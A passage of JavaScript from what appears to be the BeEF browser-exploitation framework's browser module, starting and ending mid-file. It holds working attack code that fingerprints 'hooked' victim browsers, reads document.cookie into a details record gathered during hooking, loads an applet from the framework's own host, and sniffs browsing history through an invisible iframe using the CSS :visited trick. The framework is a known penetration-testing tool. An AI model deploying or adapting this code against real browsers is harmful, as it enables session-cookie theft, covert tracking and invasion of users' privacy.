                }, installLatestJRE:function (p) {
                    if (this.isPluginInstalled() && this.isAutoInstallEnabled()) {
                        var q = false;
                        if (this.isCallbackSupported()) {
                            q = this.getPlugin().installLatestJRE(p)
                        } else {
                            q = this.getPlugin().installLatestJRE()
                        }
                        if (q) {
                            this.refresh();
                            if (this.returnPage != null) {
                                document.location = this.returnPage
                            }
                        }
                        return q
                    } else {
                        var o = this.getBrowser();
                        var n = navigator.platform.toLowerCase();
                        if ((this.EAInstallEnabled == "true") && (n.indexOf("win") != -1) && (this.EarlyAccessURL != null)) {
                            this.preInstallJREList = this.getJREs();
                            if (this.returnPage != null) {
                                this.myInterval = setInterval("deployJava.poll()", 3000)
                            }
                            location.href = this.EarlyAccessURL;
                            return false
                        } else {
                            if (o == "MSIE") {
                                return this.IEInstall()
                            } else {
                                if ((o == "Netscape Family") && (n.indexOf("win32") != -1)) {
                                    return this.FFInstall()
                                } else {
                                    location.href = this.getJavaURL + ((this.returnPage != null) ? ("&returnPage=" + this.returnPage) : "") + ((this.locale != null) ? ("&locale=" + this.locale) : "") + ((this.brand != null) ? ("&brand=" + this.brand) : "")
                                }
                            }
                            return false
                        }
                    }
                }, runApplet:function (o, t, q) {
                    if (q == "undefined" || q == null) {
                        q = "1.1"
                    }
                    var r = "^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?$";
                    var n = q.match(r);
                    if (this.returnPage == null) {
                        this.returnPage = document.location
                    }
                    if (n != null) {
                        var p = this.getBrowser();
                        if (p != "?") {
                            if (this.versionCheck(q + "+")) {
                                this.writeAppletTag(o, t)
                            } else {
                                if (this.installJRE(q + "+")) {
                                    this.refresh();
                                    location.href = document.location;
                                    this.writeAppletTag(o, t)
                                }
                            }
                        } else {
                            this.writeAppletTag(o, t)
                        }
                    } else {
                        g("[runApplet()] Invalid minimumVersion argument to runApplet():" + q)
                    }
                }, writeAppletTag:function (q, v) {
                    var n = "<applet ";
                    var p = "";
                    var r = "</applet>";
                    var w = true;
                    if (null == v || typeof v != "object") {
                        v = new Object()
                    }
                    for (var o in q) {
                        if (!c(o)) {
                            v[o] = q[o]
                        } else {
                            n += (" " + o + '="' + q[o] + '"');
                            if (o == "code") {
                                w = false
                            }
                        }
                    }
                    var u = false;
                    for (var t in v) {
                        if (t == "codebase_lookup") {
                            u = true
                        }
                        if (t == "object" || t == "java_object" || t == "java_code") {
                            w = false
                        }
                        p += '<param name="' + t + '" value="' + v[t] + '"/>'
                    }
                    if (!u) {
                        p += '<param name="codebase_lookup" value="false"/>'
                    }
                    if (w) {
                        n += (' code="dummy"')
                    }
                    n += ">";
                    document.write(n + "\n" + p + "\n" + r)
                }, versionCheck:function (o) {
                    var u = 0;
                    var w = "^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?(\\*|\\+)?$";
                    var x = o.match(w);
                    if (x != null) {
                        var q = false;
                        var t = false;
                        var p = new Array();
                        for (var r = 1; r < x.length; ++r) {
                            if ((typeof x[r] == "string") && (x[r] != "")) {
                                p[u] = x[r];
                                u++
                            }
                        }
                        if (p[p.length - 1] == "+") {
                            t = true;
                            q = false;
                            p.length--
                        } else {
                            if (p[p.length - 1] == "*") {
                                t = false;
                                q = true;
                                p.length--
                            } else {
                                if (p.length < 4) {
                                    t = false;
                                    q = true
                                }
                            }
                        }
                        var v = this.getJREs();
                        for (var r = 0; r < v.length; ++r) {
                            if (this.compareVersionToPattern(v[r], p, q, t)) {
                                return true
                            }
                        }
                        return false
                    } else {
                        var n = "Invalid versionPattern passed to versionCheck: " + o;
                        g("[versionCheck()] " + n);
                        alert(n);
                        return false
                    }
                }, isWebStartInstalled:function (q) {
                    var p = this.getBrowser();
                    if (p == "?") {
                        return true
                    }
                    if (q == "undefined" || q == null) {
                        q = "1.4.2"
                    }
                    var o = false;
                    var r = "^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?$";
                    var n = q.match(r);
                    if (n != null) {
                        o = this.versionCheck(q + "+")
                    } else {
                        g("[isWebStartInstaller()] Invalid minimumVersion argument to isWebStartInstalled(): " + q);
                        o = this.versionCheck("1.4.2+")
                    }
                    return o
                }, getJPIVersionUsingMimeType:function () {
                    for (var o = 0; o < navigator.mimeTypes.length; ++o) {
                        var p = navigator.mimeTypes[o].type;
                        var n = p.match(/^application\/x-java-applet;jpi-version=(.*)$/);
                        if (n != null) {
                            this.firefoxJavaVersion = n[1];
                            if ("Opera" != this.browserName2) {
                                break
                            }
                        }
                    }
                }, launchWebStartApplication:function (q) {
                    var n = navigator.userAgent.toLowerCase();
                    this.getJPIVersionUsingMimeType();
                    if (this.isWebStartInstalled("1.7.0") == false) {
                        if ((this.installJRE("1.7.0+") == false) || ((this.isWebStartInstalled("1.7.0") == false))) {
                            return false
                        }
                    }
                    var t = null;
                    if (document.documentURI) {
                        t = document.documentURI
                    }
                    if (t == null) {
                        t = document.URL
                    }
                    var o = this.getBrowser();
                    var p;
                    if (o == "MSIE") {
                        p = '<object classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" width="0" height="0"><PARAM name="launchjnlp" value="' + q + '"><PARAM name="docbase" value="' + t + '"></object>'
                    } else {
                        if (o == "Netscape Family") {
                            p = '<embed type="application/x-java-applet;jpi-version=' + this.firefoxJavaVersion + '" width="0" height="0" launchjnlp="' + q + '"docbase="' + t + '" />'
                        }
                    }
                    if (document.body == "undefined" || document.body == null) {
                        document.write(p);
                        document.location = t
                    } else {
                        var r = document.createElement("div");
                        r.id = "div1";
                        r.style.position = "relative";
                        r.style.left = "-10000px";
                        r.style.margin = "0px auto";
                        r.className = "dynamicDiv";
                        r.innerHTML = p;
                        document.body.appendChild(r)
                    }
                }, createWebStartLaunchButtonEx:function (p, o) {
                    if (this.returnPage == null) {
                        this.returnPage = p
                    }
                    var n = "javascript:deployJava.launchWebStartApplication('" + p + "');";
                    document.write('<a href="' + n + '" onMouseOver="window.status=\'\'; return true;"><img src="' + this.launchButtonPNG + '" border="0" /></a>')
                }, createWebStartLaunchButton:function (p, o) {
                    if (this.returnPage == null) {
                        this.returnPage = p
                    }
                    var n = "javascript:if (!deployJava.isWebStartInstalled(&quot;" + o + "&quot;)) {if (deployJava.installLatestJRE()) {if (deployJava.launch(&quot;" + p + "&quot;)) {}}} else {if (deployJava.launch(&quot;" + p + "&quot;)) {}}";
                    document.write('<a href="' + n + '" onMouseOver="window.status=\'\'; return true;"><img src="' + this.launchButtonPNG + '" border="0" /></a>')
                }, launch:function (n) {
                    document.location = n;
                    return true
                }, isPluginInstalled:function () {
                    var n = this.getPlugin();
                    if (n && n.jvms) {
                        return true
                    } else {
                        return false
                    }
                }, isAutoUpdateEnabled:function () {
                    if (this.isPluginInstalled()) {
                        return this.getPlugin().isAutoUpdateEnabled()
                    }
                    return false
                }, setAutoUpdateEnabled:function () {
                    if (this.isPluginInstalled()) {
                        return this.getPlugin().setAutoUpdateEnabled()
                    }
                    return false
                }, setInstallerType:function (n) {
                    this.installType = n;
                    if (this.isPluginInstalled()) {
                        return this.getPlugin().setInstallerType(n)
                    }
                    return false
                }, setAdditionalPackages:function (n) {
                    if (this.isPluginInstalled()) {
                        return this.getPlugin().setAdditionalPackages(n)
                    }
                    return false
                }, setEarlyAccess:function (n) {
                    this.EAInstallEnabled = n
                }, isPlugin2:function () {
                    if (this.isPluginInstalled()) {
                        if (this.versionCheck("1.6.0_10+")) {
                            try {
                                return this.getPlugin().isPlugin2()
                            } catch (n) {
                            }
                        }
                    }
                    return false
                }, allowPlugin:function () {
                    this.getBrowser();
                    var n = ("Safari" != this.browserName2 && "Opera" != this.browserName2);
                    return n
                }, getPlugin:function () {
                    this.refresh();
                    var n = null;
                    if (this.allowPlugin()) {
                        n = document.getElementById("deployJavaPlugin")
                    }
                    return n
                }, compareVersionToPattern:function (u, o, q, r) {
                    if (u == undefined || o == undefined) {
                        return false
                    }
                    var v = "^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?$";
                    var w = u.match(v);
                    if (w != null) {
                        var t = 0;
                        var x = new Array();
                        for (var p = 1; p < w.length; ++p) {
                            if ((typeof w[p] == "string") && (w[p] != "")) {
                                x[t] = w[p];
                                t++
                            }
                        }
                        var n = Math.min(x.length, o.length);
                        if (r) {
                            for (var p = 0; p < n; ++p) {
                                if (x[p] < o[p]) {
                                    return false
                                } else {
                                    if (x[p] > o[p]) {
                                        return true
                                    }
                                }
                            }
                            return true
                        } else {
                            for (var p = 0; p < n; ++p) {
                                if (x[p] != o[p]) {
                                    return false
                                }
                            }
                            if (q) {
                                return true
                            } else {
                                return(x.length == o.length)
                            }
                        }
                    } else {
                        return false
                    }
                }, getBrowser:function () {
                    if (this.browserName == null) {
                        var n = navigator.userAgent.toLowerCase();
                        g("[getBrowser()] navigator.userAgent.toLowerCase() -> " + n);
                        if ((n.indexOf("msie") != -1) && (n.indexOf("opera") == -1)) {
                            this.browserName = "MSIE";
                            this.browserName2 = "MSIE"
                        } else {
                            if (n.indexOf("iphone") != -1) {
                                this.browserName = "Netscape Family";
                                this.browserName2 = "iPhone"
                            } else {
                                if ((n.indexOf("firefox") != -1) && (n.indexOf("opera") == -1)) {
                                    this.browserName = "Netscape Family";
                                    this.browserName2 = "Firefox"
                                } else {
                                    if (n.indexOf("chrome") != -1) {
                                        this.browserName = "Netscape Family";
                                        this.browserName2 = "Chrome"
                                    } else {
                                        if (n.indexOf("safari") != -1) {
                                            this.browserName = "Netscape Family";
                                            this.browserName2 = "Safari"
                                        } else {
                                            if ((n.indexOf("mozilla") != -1) && (n.indexOf("opera") == -1)) {
                                                this.browserName = "Netscape Family";
                                                this.browserName2 = "Other"
                                            } else {
                                                if (n.indexOf("opera") != -1) {
                                                    this.browserName = "Netscape Family";
                                                    this.browserName2 = "Opera"
                                                } else {
                                                    this.browserName = "?";
                                                    this.browserName2 = "unknown"
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        g("[getBrowser()] Detected browser name:" + this.browserName + ", " + this.browserName2)
                    }
                    return this.browserName
                }, testUsingActiveX:function (n) {
                    var p = "JavaWebStart.isInstalled." + n + ".0";
                    if (typeof ActiveXObject == "undefined" || !ActiveXObject) {
                        g("[testUsingActiveX()] Browser claims to be IE, but no ActiveXObject object?");
                        return false
                    }
                    try {
                        return(new ActiveXObject(p) != null)
                    } catch (o) {
                        return false
                    }
                }, testForMSVM:function () {
                    var o = "{08B0E5C0-4FCB-11CF-AAA5-00401C608500}";
                    if (typeof oClientCaps != "undefined") {
                        var n = oClientCaps.getComponentVersion(o, "ComponentID");
                        if ((n == "") || (n == "5,0,5000,0")) {
                            return false
                        } else {
                            return true
                        }
                    } else {
                        return false
                    }
                }, testUsingMimeTypes:function (o) {
                    if (!navigator.mimeTypes) {
                        g("[testUsingMimeTypes()] Browser claims to be Netscape family, but no mimeTypes[] array?");
                        return false
                    }
                    for (var p = 0; p < navigator.mimeTypes.length; ++p) {
                        s = navigator.mimeTypes[p].type;
                        var n = s.match(/^application\/x-java-applet\x3Bversion=(1\.8|1\.7|1\.6|1\.5|1\.4\.2)$/);
                        if (n != null) {
                            if (this.compareVersions(n[1], o)) {
                                return true
                            }
                        }
                    }
                    return false
                }, testUsingPluginsArray:function (o) {
                    if ((!navigator.plugins) || (!navigator.plugins.length)) {
                        return false
                    }
                    var n = navigator.platform.toLowerCase();
                    for (var p = 0; p < navigator.plugins.length; ++p) {
                        s = navigator.plugins[p].description;
                        if (s.search(/^Java Switchable Plug-in (Cocoa)/) != -1) {
                            if (this.compareVersions("1.5.0", o)) {
                                return true
                            }
                        } else {
                            if (s.search(/^Java/) != -1) {
                                if (n.indexOf("win") != -1) {
                                    if (this.compareVersions("1.5.0", o) || this.compareVersions("1.6.0", o)) {
                                        return true
                                    }
                                }
                            }
                        }
                    }
                    if (this.compareVersions("1.5.0", o)) {
                        return true
                    }
                    return false
                }, IEInstall:function () {
                    location.href = this.getJavaURL + ((this.returnPage != null) ? ("&returnPage=" + this.returnPage) : "") + ((this.locale != null) ? ("&locale=" + this.locale) : "") + ((this.brand != null) ? ("&brand=" + this.brand) : "");
                    return false
                }, done:function (o, n) {
                }, FFInstall:function () {
                    location.href = this.getJavaURL + ((this.returnPage != null) ? ("&returnPage=" + this.returnPage) : "") + ((this.locale != null) ? ("&locale=" + this.locale) : "") + ((this.brand != null) ? ("&brand=" + this.brand) : "") + ((this.installType != null) ? ("&type=" + this.installType) : "");
                    return false
                }, compareVersions:function (q, r) {
                    var o = q.split(".");
                    var n = r.split(".");
                    for (var p = 0; p < o.length; ++p) {
                        o[p] = Number(o[p])
                    }
                    for (var p = 0; p < n.length; ++p) {
                        n[p] = Number(n[p])
                    }
                    if (o.length == 2) {
                        o[2] = 0
                    }
                    if (o[0] > n[0]) {
                        return true
                    }
                    if (o[0] < n[0]) {
                        return false
                    }
                    if (o[1] > n[1]) {
                        return true
                    }
                    if (o[1] < n[1]) {
                        return false
                    }
                    if (o[2] > n[2]) {
                        return true
                    }
                    if (o[2] < n[2]) {
                        return false
                    }
                    return true
                }, enableAlerts:function () {
                    this.browserName = null;
                    this.debug = true
                }, poll:function () {
                    this.refresh();
                    var n = this.getJREs();
                    if ((this.preInstallJREList.length == 0) && (n.length != 0)) {
                        clearInterval(this.myInterval);
                        if (this.returnPage != null) {
                            location.href = this.returnPage
                        }
                    }
                    if ((this.preInstallJREList.length != 0) && (n.length != 0) && (this.preInstallJREList[0] != n[0])) {
                        clearInterval(this.myInterval);
                        if (this.returnPage != null) {
                            location.href = this.returnPage
                        }
                    }
                }, writePluginTag:function () {
                    var n = this.getBrowser();
                    if (n == "MSIE") {
                        document.write('<object classid="clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA" id="deployJavaPlugin" width="0" height="0"></object>')
                    } else {
                        if (n == "Netscape Family" && this.allowPlugin()) {
                            this.writeEmbedTag()
                        }
                    }
                }, refresh:function () {
                    navigator.plugins.refresh(false);
                    var n = this.getBrowser();
                    if (n == "Netscape Family" && this.allowPlugin()) {
                        var o = document.getElementById("deployJavaPlugin");
                        if (o == null) {
                            this.writeEmbedTag()
                        }
                    }
                }, writeEmbedTag:function () {
                    var n = false;
                    if (navigator.mimeTypes != null) {
                        for (var o = 0; o < navigator.mimeTypes.length; o++) {
                            if (navigator.mimeTypes[o].type == this.mimeType) {
                                if (navigator.mimeTypes[o].enabledPlugin) {
                                    document.write('<embed id="deployJavaPlugin" type="' + this.mimeType + '" hidden="true" />');
                                    n = true
                                }
                            }
                        }
                        if (!n) {
                            for (var o = 0; o < navigator.mimeTypes.length; o++) {
                                if (navigator.mimeTypes[o].type == this.oldMimeType) {
                                    if (navigator.mimeTypes[o].enabledPlugin) {
                                        document.write('<embed id="deployJavaPlugin" type="' + this.oldMimeType + '" hidden="true" />')
                                    }
                                }
                            }
                        }
                    }
                }};
                d.writePluginTag();
                if (d.locale == null) {
                    var h = null;
                    if (h == null) {
                        try {
                            h = navigator.userLanguage
                        } catch (f) {
                        }
                    }
                    if (h == null) {
                        try {
                            h = navigator.systemLanguage
                        } catch (f) {
                        }
                    }
                    if (h == null) {
                        try {
                            h = navigator.language
                        } catch (f) {
                        }
                    }
                    if (h != null) {
                        h.replace("-", "_");
                        d.locale = h
                    }
                }
                return d
            }();

            var versionJRE = deployJava.getJREs();

            if (versionJRE != '') {
                return true;
            } else {
                return false;
            }
        }
        else {
            function testUsingActiveX(n) {
                var p = "JavaWebStart.isInstalled." + n + ".0";
                if (typeof ActiveXObject == "undefined" || !ActiveXObject) {
                    g("[testUsingActiveX()] Browser claims to be IE, but no ActiveXObject object?");
                    return false
                }
                try {
                    return (new ActiveXObject(p) != null)
                } catch (o) {
                    return false
                }
            }

            if (testUsingActiveX("1.7.0")) {
                return true;
            } else {
                if (testUsingActiveX("1.6.0")) {
                    return true;
                } else {
                    if (testUsingActiveX("1.5.0")) {
                        return true;
                    } else {
                        if (testUsingActiveX("1.4.2")) {
                            return true;
                        }
                        else {
                            return false;
                        }
                    }
                }
            }


        }

    },

    /**
     * Checks if the Phonegap API is available from the hooked domain.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasPhonegap()) { ... }
     */
    hasPhonegap:function () {
        var result = false;
        try {
            if (!!device.phonegap) result = true; else result = false;
        }
        catch (e) {
            result = false;
        }
        return result;
    },

    /**
     * Checks if the browser supports CORS
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasCors()) { ... }
     */
    hasCors:function () {
        if ('withCredentials' in new XMLHttpRequest())
            return true;
        else if (typeof XDomainRequest !== "undefined")
            return true;
        else
            return false;
    },

    /**
     * Checks if the zombie has Java installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasJava()) { ... }
     */
    hasJava:function () {

        // Check if Java is enabled
        if (!beef.browser.javaEnabled()) {
            return false;
        }

        // This is a temporary fix as this does not work on Safari and Chrome
        // Chrome requires manual user intervention even with unsigned applets.
        // Safari requires a few seconds to load the applet.
        if (beef.browser.isC() || beef.browser.isS()) {
            return true;
        }

        // Inject an unsigned java applet to double check if the Java
        // plugin is working fine.
        try {
            var applet_archive = 'http://' + beef.net.host + ':' + beef.net.port + '/demos/checkJava.jar';
            var applet_id = 'checkJava';
            var applet_name = 'checkJava';
            var output;
            beef.dom.attachApplet(applet_id, 'Microsoft_Corporation', 'checkJava',
                null, applet_archive, null);
            output = document.Microsoft_Corporation.getInfo();
            beef.dom.detachApplet('checkJava');
            return output = 1;
        } catch (e) {
            return false;
        }
    },

    /**
     * Checks if the zombie has VBScript enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasVBScript()) { ... }
     */
    hasVBScript:function () {
        if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
            return true;
        } else {
            return false;
        }
    },

    /**
     * Returns the list of plugins installed in the browser.
     */
    getPlugins:function () {

        var results;
        Array.prototype.unique = function () {
            var o = {}, i, l = this.length, r = [];
            for (i = 0; i < l; i += 1) o[this[i]] = this[i];
            for (i in o) r.push(o[i]);
            return r;
        };

        // Internet Explorer
        if (this.isIE()) this.getPluginsIE();

        // All other browsers that support navigator.plugins
        else if (navigator.plugins && navigator.plugins.length > 0) {
            results = new Array();
            for (var i = 0; i < navigator.plugins.length; i++) {

                // Firefox returns exact plugin versions
                if (beef.browser.isFF()) results[i] = navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;

                // Webkit and Presto (Opera)
                // Don't support the version attribute
                // Sometimes store the version in description (Real, Adobe)
                else results[i] = navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
            }
            results = results.unique().toString();

            // All browsers that don't support navigator.plugins
        } else {
            results = new Array();
            //firefox https://bugzilla.mozilla.org/show_bug.cgi?id=757726
            // On linux sistem the "version" slot is empty so I'll attach "description" after version
            var plugins = {

                'AdobeAcrobat':{
                    'control':'Adobe Acrobat',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Adobe Acrobat"]["description"];
                            return 'Adobe Acrobat Version  ' + version; //+ " description "+ filename;

                        }
                        catch (e) {
                        }


                    }},
                'Flash':{
                    'control':'Shockwave Flash',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Shockwave Flash"]["description"];
                            return 'Flash Player Version ' + version; //+ " description "+ filename;
                        }

                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin_Accelerator':{
                    'control':'Google Talk Plugin Video Accelerator',
                    'return':function (control) {

                        try {
                            version = navigator.plugins['Google Talk Plugin Video Accelerator']["description"];
                            return 'Google Talk Plugin Video Accelerator Version ' + version; //+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin':{
                    'control':'Google Talk Plugin',
                    'return':function (control) {
                        try {
                            version = navigator.plugins['Google Talk Plugin']["description"];
                            return 'Google Talk Plugin Version ' + version;// " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Facebook_Video_Calling_Plugin':{
                    'control':'Facebook Video Calling Plugin',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Facebook Video Calling Plugin"]["description"];
                            return 'Facebook Video Calling Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Update':{
                    'control':'Google Update',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Google Update"]["description"];
                            return 'Google Update Version ' + version//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Windows_Activation_Technologies':{
                    'control':'Windows Activation Technologies',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Windows Activation Technologies"]["description"];
                            return 'Windows Activation Technologies Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }

                    }},
                'VLC_Web_Plugin':{
                    'control':'VLC Web Plugin',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["VLC Web Plugin"]["description"];
                            return 'VLC Web Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Earth_Plugin':{
                    'control':'Google Earth Plugin',

                    'return':function (control) {
                        try {
                            version = navigator.plugins['Google Earth Plugin']["description"];
                            return 'Google Earth Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Silverlight_Plug-In':{
                    'control':'Silverlight Plug-In',
                    'return':function (control) {
                        try {
                            version = navigator.plugins['Silverlight Plug-In']["description"];
                            return 'Silverlight Plug-In Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }}
            };

            var c = 0;
            for (var i in plugins) {
                //each element od plugins
                var control = plugins[i]['control'];
                try {
                    var version = plugins[i]['return'](control);
                    if (version) {
                        results[c] = version;
                        c = c + 1;
                    }
                }
                catch (e) {
                }

            }
        }
        // Return results
        return results;
    },

    /**
     * Returns a list of plugins detected by IE. This is a hack because IE doesn't
     * support navigator.plugins
     */
    getPluginsIE:function () {
        var results = '';
        var plugins = {'AdobePDF6':{
            'control':'PDF.PdfCtrl',
            'return':function (control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v' + parseFloat(version[1]);
            }},
            'AdobePDF7':{
                'control':'AcroPDF.PDF',
                'return':function (control) {
                    version = control.getVersions().split(',');
                    version = version[0].split('=');
                    return 'Acrobat Reader v' + parseFloat(version[1]);
                }},
            'Flash':{
                'control':'ShockwaveFlash.ShockwaveFlash',
                'return':function (control) {
                    version = control.getVariable('$version').substring(4);
                    return 'Flash Player v' + version.replace(/,/g, ".");
                }},
            'Quicktime':{
                'control':'QuickTime.QuickTime',
                'return':function (control) {
                    return 'QuickTime Player';
                }},
            'RealPlayer':{
                'control':'RealPlayer',
                'return':function (control) {
                    version = control.getVersionInfo();
                    return 'RealPlayer v' + parseFloat(version);
                }},
            'Shockwave':{
                'control':'SWCtl.SWCtl',
                'return':function (control) {
                    version = control.ShockwaveVersion('').split('r');
                    return 'Shockwave v' + parseFloat(version[0]);
                }},
            'WindowsMediaPlayer':{
                'control':'WMPlayer.OCX',
                'return':function (control) {
                    return 'Windows Media Player v' + parseFloat(control.versionInfo);
                }}
        };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins) {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) {
                }
                if (control) {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

    /**
     * Returns zombie screen size and color depth.
     */
    getScreenSize:function () {
        return {
            width:window.screen.width,
            height:window.screen.height,
            colordepth:window.screen.colorDepth
        }
    },

    /**
     * Returns zombie browser window size.
     * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
     */
    getWindowSize:function () {
        var myWidth = 0, myHeight = 0;
        if (typeof( window.innerWidth ) == 'number') {
            // Non-IE
            myWidth = window.innerWidth;
            myHeight = window.innerHeight;
        } else if (document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight )) {
            // IE 6+ in 'standards compliant mode'
            myWidth = document.documentElement.clientWidth;
            myHeight = document.documentElement.clientHeight;
        } else if (document.body && ( document.body.clientWidth || document.body.clientHeight )) {
            // IE 4 compatible
            myWidth = document.body.clientWidth;
            myHeight = document.body.clientHeight;
        }
        return {
            width:myWidth,
            height:myHeight
        }
    },

    /**
     * Construct hash from browser details. This function is used to grab the browser details during the hooking process
     */
    getDetails:function () {
        var details = new Array();

        var browser_name = beef.browser.getBrowserName();
        var browser_version = beef.browser.getBrowserVersion();
        var browser_reported_name = beef.browser.getBrowserReportedName();
        var page_title = (document.title) ? document.title : "Unknown";
        var page_uri = document.location.href;
        var page_referrer = (document.referrer) ? document.referrer : "Unknown";
        var hostname = document.location.hostname;
        var hostport = (document.location.port) ? document.location.port : "80";
        var browser_plugins = beef.browser.getPlugins();
        var date_stamp = new Date().toString();
        var os_name = beef.os.getName();
        var hw_name = beef.hardware.getName();
        var cpu_type = beef.hardware.cpuType();
        var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
        var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
        var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {
            if (value == true) return value; else if (typeof value == 'object') return value; else return;
        });
        var screen_size = beef.browser.getScreenSize();
        var window_size = beef.browser.getWindowSize();
        var java_enabled = (beef.browser.javaEnabled()) ? "Yes" : "No";
        var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
        var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
        var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
        var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
        var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
        var has_activex = (beef.browser.hasActiveX()) ? "Yes" : "No";
        var has_silverlight = (beef.browser.hasSilverlight()) ? "Yes" : "No";
        var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
        var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
        var has_vlc = (beef.browser.hasVLC()) ? "Yes" : "No";
        try{
            var cookies = document.cookie;
            var has_session_cookies = (beef.browser.cookie.hasSessionCookies("cookie")) ? "Yes" : "No";
            var has_persistent_cookies = (beef.browser.cookie.hasPersistentCookies("cookie")) ? "Yes" : "No";
            if (cookies) details["Cookies"] = cookies;
            if (has_session_cookies) details["hasSessionCookies"] = has_session_cookies;
            if (has_persistent_cookies) details["hasPersistentCookies"] = has_persistent_cookies;
        }catch(e){
            // the hooked domain is using HttpOnly. EverCookie is persisting the BeEF hook in a different way,
            // and there is no reason to read cookies at this point
            details["Cookies"] = "Cookies can't be read. The hooked domain is most probably using HttpOnly.";
            details["hasSessionCookies"] = "No";
            details["hasPersistentCookies"] = "No";
        }

        if (browser_name) details["BrowserName"] = browser_name;
        if (browser_version) details["BrowserVersion"] = browser_version;
        if (browser_reported_name) details["BrowserReportedName"] = browser_reported_name;
        if (page_title) details["PageTitle"] = page_title;
        if (page_uri) details["PageURI"] = page_uri;
        if (page_referrer) details["PageReferrer"] = page_referrer;
        if (hostname) details["HostName"] = hostname;
        if (hostport) details["HostPort"] = hostport;
        if (browser_plugins) details["BrowserPlugins"] = browser_plugins;
        if (os_name) details['OsName'] = os_name;
        if (hw_name) details['Hardware'] = hw_name;
        if (cpu_type) details['CPU'] = cpu_type;
        if (touch_enabled) details['TouchEnabled'] = touch_enabled;
        if (date_stamp) details['DateStamp'] = date_stamp;
        if (browser_platform) details['BrowserPlatform'] = browser_platform;
        if (browser_type) details['BrowserType'] = browser_type;
        if (screen_size) details['ScreenSize'] = screen_size;
        if (window_size) details['WindowSize'] = window_size;
        if (java_enabled) details['JavaEnabled'] = java_enabled;
        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled
        if (has_flash) details['HasFlash'] = has_flash
        if (has_phonegap) details['HasPhonegap'] = has_phonegap
        if (has_web_socket) details['HasWebSocket'] = has_web_socket
        if (has_googlegears) details['HasGoogleGears'] = has_googlegears
        if (has_activex) details['HasActiveX'] = has_activex;
        if (has_silverlight) details['HasSilverlight'] = has_silverlight;
        if (has_quicktime) details['HasQuickTime'] = has_quicktime;
        if (has_realplayer) details['HasRealPlayer'] = has_realplayer;
        if (has_vlc) details['HasVLC'] = has_vlc ;

        return details;
    },

    /**
     * Returns boolean value depending on whether the browser supports ActiveX
     */
    hasActiveX:function () {
        return !!window.ActiveXObject;
    },

    /**
     * Returns boolean value depending on whether the browser supports Silverlight
     */
    hasSilverlight:function () {
        var result = false;

        try {
            if (beef.browser.isIE()) {
                var slControl = new ActiveXObject('AgControl.AgControl');
                result = true;
            } else if (navigator.plugins["Silverlight Plug-In"]) {
                result = true;
            }
        } catch (e) {
            result = false;
        }

        return result;
    },

    /**
     * Returns array of results, whether or not the target zombie has visited the specified URL
     */
    hasVisited:function (urls) {
        var results = new Array();
        var iframe = beef.dom.createInvisibleIframe();
        var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
        ifdoc.open();
        ifdoc.write('<style>a:visited{width:0px !important;}</style>');
        ifdoc.close();
        urls = urls.split("\n");
        var count = 0;
        for (var i in urls) {
            var u = urls[i];
            if (u != "" || u != null) {
                var success = false;
                var a = ifdoc.createElement('a');
                a.href = u;
                ifdoc.body.appendChild(a);
                var width = null;
                (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
                if (width == '0px') {
                    success = true;
                }
                results.push({'url':u, 'visited':success});
                count++;
            }
        }
        beef.dom.removeElement(iframe);
        if (results.length == 0) {
            return false;
        }
        return results;
    },

    /**
